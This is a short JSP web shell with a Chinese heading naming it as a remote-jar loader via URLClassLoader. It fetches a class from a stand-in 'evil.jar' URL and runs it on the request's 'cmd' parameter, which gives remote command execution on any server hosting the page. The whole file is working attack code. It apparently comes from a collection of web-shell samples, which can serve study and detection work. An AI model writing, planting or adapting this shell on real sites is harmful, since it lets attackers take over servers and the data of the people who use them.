<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<html>
<body>
<h2>URLClassLoader加载远程jar的JSP WebShell</h2>
<%
    response.getOutputStream().write(new URLClassLoader(new URL[]{new URL("http://127.0.0.1:80/evil.jar")}).loadClass(
            "EvilBB01").getConstructor(String.class).newInstance(String.valueOf(request.getParameter("cmd"))).toString().getBytes());
%>
</body>
</html>